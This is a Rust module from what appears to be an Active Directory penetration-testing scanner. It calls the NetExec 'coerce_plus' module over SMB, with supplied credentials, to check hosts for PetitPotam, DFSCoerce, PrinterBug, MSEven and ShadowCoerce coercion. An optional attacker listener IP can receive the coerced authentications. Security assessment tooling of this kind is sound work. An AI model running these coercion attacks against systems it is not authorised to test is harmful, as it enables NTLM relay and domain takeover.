//! Authentication coercion vulnerability scan (PetitPotam, DFSCoerce,
//! PrinterBug, MSEven, ShadowCoerce) via the nxc `coerce_plus` module.

use super::{AttackContext, require_nxc};
use crate::findings::{CheckStatus, Finding, ScanResults, Severity};
use anyhow::Result;

/// Run the coercion check against every host in `hosts`.
///
/// `listener` is an optional attacker IP that coerced authentications would
/// be redirected to (passed to coerce_plus as LISTENER).
pub async fn run(
    ctx: &AttackContext<'_>,
    hosts: &[String],
    listener: Option<&str>,
    results: &ScanResults,
) -> Result<()> {
    let nxc = match require_nxc(ctx.nxc) {
        Ok(n) => n,
        Err(err) => {
            results.push(Finding::new(
                ctx.dc,
                "coerce",
                "coerce_plus",
                CheckStatus::Error,
                Severity::Info,
                serde_json::json!({ "message": err.to_string() }),
            ));
            return Ok(());
        }
    };

    for host in hosts {
        let mut args: Vec<&str> = vec!["smb", host];
        let secret = ctx.nxc_secret_args();
        let owned: Vec<String> = secret;
        let mut refs: Vec<&str> = owned.iter().map(String::as_str).collect();
        args.append(&mut refs);
        let listener_owned;
        if let Some(ip) = listener {
            listener_owned = format!("LISTENER={}", ip);
            args.extend(["-M", "coerce_plus", "-o", listener_owned.as_str()]);
        } else {
            args.extend(["-M", "coerce_plus"]);
        }
        match nxc.run(&args).await {
            Ok((stdout, _stderr, success)) => {
                let lower = stdout.to_lowercase();
                let vulnerable = lower.contains("vulnerable") || lower.contains("success");
                let status = if !success {
                    CheckStatus::Error
                } else if vulnerable {
                    CheckStatus::Vulnerable
                } else {
                    CheckStatus::NotVulnerable
                };
                let severity = if vulnerable { Severity::High } else { Severity::Info };
                results.push(Finding::new(
                    host,
                    "coerce",
                    "coerce_plus",
                    status,
                    severity,
                    serde_json::json!({
                        "methods": ["PetitPotam", "DFSCoerce", "PrinterBug", "MSEven", "ShadowCoerce"],
                        "listener": listener,
                        "stdout": stdout.trim(),
                    }),
                ));
            }
            Err(e) => {
                results.push(Finding::new(
                    host,
                    "coerce",
                    "coerce_plus",
                    CheckStatus::Error,
                    Severity::Info,
                    serde_json::json!({ "message": e.to_string() }),
                ));
            }
        }
    }
    Ok(())
}
